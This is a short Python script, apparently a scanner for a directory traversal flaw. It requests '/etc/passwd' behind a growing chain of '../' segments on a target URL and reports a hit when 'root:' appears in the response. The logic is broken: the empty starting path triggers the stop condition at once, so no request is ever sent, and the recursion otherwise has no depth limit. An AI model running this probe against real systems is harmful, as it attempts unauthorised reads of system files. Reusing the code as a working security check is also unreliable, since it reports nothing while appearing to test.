import requests

def check_vulnerability(url, path):
    '''Recursively check for directory traversal vulnerability in a URL.'''
    # Base case: if the path is empty, stop recursion
    if path == "":
        return False
    
    # Construct the full URL to test
    test_url = url + path + "/etc/passwd"
    
    # Make a request to the test URL
    response = requests.get(test_url)
    
    # Check if the response contains a sensitive file
    if "root:" in response.text:
        print(f"Vulnerable URL found: {test_url}")
        return True
    
    # Recursive case: call the function with the parent directory
    return check_vulnerability(url, path + "../")

# Start checking from the root directory
url = "http://example.com/"
initial_path = ""
check_vulnerability(url, initial_path)